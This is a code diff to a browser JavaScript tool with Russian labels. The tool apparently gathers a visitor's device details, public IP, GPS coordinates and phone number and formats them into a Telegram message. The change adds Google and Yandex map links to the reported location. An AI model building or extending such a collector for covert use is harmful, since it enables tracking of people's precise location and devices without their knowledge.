@@ -254,6 +254,8 @@
                                 const lon = position.coords.longitude.toFixed(6);
                                 const accuracy = position.coords.accuracy.toFixed(2);
                                 info.gpsLocation = `Широта: ${lat}, Долгота: ${lon} (Точность: ${accuracy} м)`;
+                                info.googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+                                info.yandexMapsLink = `https://yandex.ru/maps/?ll=${lon},${lat}&z=15`; // Yandex uses lon,lat
                                 resolve();
                             },
                             (error) => {
@@ -273,6 +275,8 @@
                                         break;
                                 }
                                 info.gpsLocation = `Ошибка: ${errorMessageGeo}`;
+                                info.googleMapsLink = 'Недоступно';
+                                info.yandexMapsLink = 'Недоступно';
                                 resolve();
                             },
                             {
@@ -284,9 +288,13 @@
                     });
                 } else {
                     info.gpsLocation = 'API геолокации не поддерживается';
+                    info.googleMapsLink = 'Недоступно';
+                    info.yandexMapsLink = 'Недоступно';
                 }
             } else {
                 info.gpsLocation = 'Не запрошено';
+                info.googleMapsLink = 'Не запрошено';
+                info.yandexMapsLink = 'Не запрошено';
             }
 
             if (includePhoneNumber && collectedDeviceInfo.phoneNumber) {
@@ -331,7 +339,7 @@
             const sections = {
                 'Основные данные': ['userAgent', 'osInfo', 'platform', 'browserName', 'browserVersion', 'deviceName'],
                 'Информация о сети': ['publicIp', 'connectionType', 'networkType', 'bluetoothAPI', 'usbAPI'],
-                'Местоположение': ['ipLocation', 'gpsLocation'],
+                'Местоположение': ['ipLocation', 'gpsLocation', 'googleMapsLink', 'yandexMapsLink'], // Added links here
                 'Аппаратное обеспечение': ['hardwareConcurrency', 'deviceMemory', 'batteryStatus'],
                 'Дисплей': ['screenResolution', 'availableScreenResolution', 'viewportSize', 'colorDepth', 'devicePixelRatio', 'touchSupport'],
                 'Дополнительно': ['cookiesEnabled', 'languages', 'timezone']
@@ -360,6 +368,8 @@
                             case 'usbAPI': displayKey = 'API USB'; break;
                             case 'ipLocation': displayKey = 'Местоположение по IP'; break;
                             case 'gpsLocation': displayKey = 'GPS координаты'; break;
+                            case 'googleMapsLink': displayKey = 'Google Maps'; break; // Added display key
+                            case 'yandexMapsLink': displayKey = 'Яндекс Карты'; break; // Added display key
                             case 'hardwareConcurrency': displayKey = 'Логические ядра CPU'; break;
                             case 'deviceMemory': displayKey = 'Память устройства (ГБ)'; break;
                             case 'batteryStatus': displayKey = 'Статус батареи'; break;
@@ -374,11 +384,18 @@
                             case 'timezone': displayKey = 'Часовой пояс'; break;
                         }
 
-                        telegramHtmlMessage += `<b>${escapeHtml(displayKey)}:</b> ${escapeHtml(String(value))}`;
-                        if (note) {
-                            telegramHtmlMessage += ` <i>${escapeHtml(note)}</i>`;
+                        if (key === 'googleMapsLink' && value !== 'Недоступно' && value !== 'Не запрошено') {
+                            telegramHtmlMessage += `<b>${escapeHtml(displayKey)}:</b> <a href="${escapeHtml(String(value))}">Открыть на карте</a>\n`;
+                        } else if (key === 'yandexMapsLink' && value !== 'Недоступно' && value !== 'Не запрошено') {
+                            telegramHtmlMessage += `<b>${escapeHtml(displayKey)}:</b> <a href="${escapeHtml(String(value))}">Открыть на карте</a>\n`;
                         }
-                        telegramHtmlMessage += `\n`;
+                        else {
+                            telegramHtmlMessage += `<b>${escapeHtml(displayKey)}:</b> ${escapeHtml(String(value))}`;
+                            if (note) {
+                                telegramHtmlMessage += ` <i>${escapeHtml(note)}</i>`;
+                            }
+                            telegramHtmlMessage += `\n`;
+                        }
                     }
                 });
                 telegramHtmlMessage += `\n`;
